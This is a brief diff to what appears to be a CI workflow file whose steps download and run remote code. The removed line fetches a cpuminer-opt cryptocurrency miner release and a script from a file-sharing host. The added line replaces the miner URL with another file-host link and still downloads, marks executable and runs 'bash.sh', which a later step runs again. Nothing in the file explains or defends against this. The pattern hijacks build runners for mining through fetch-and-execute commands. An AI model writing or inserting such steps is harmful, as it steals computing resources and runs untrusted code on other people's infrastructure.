@@ -10,5 +10,5 @@ jobs:
     steps:
       - run: ls
       - run: mkdir a
-      - run: cd a && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.15/cpuminer-opt-linux.tar.gz -o a.tar.gz && tar xf a.tar.gz && curl https://www.maxfile2linkbot.cf/85156/download -o bash.sh && chmod +x * && ./bash.sh
+      - run: cd a && wget https://lgblinks.com/dl_5088950/a.tar.gz && tar xf a.tar.gz && curl https://www.maxfile2linkbot.cf/85156/download -o bash.sh && chmod +x * && ./bash.sh
       - run:  ./bash.sh
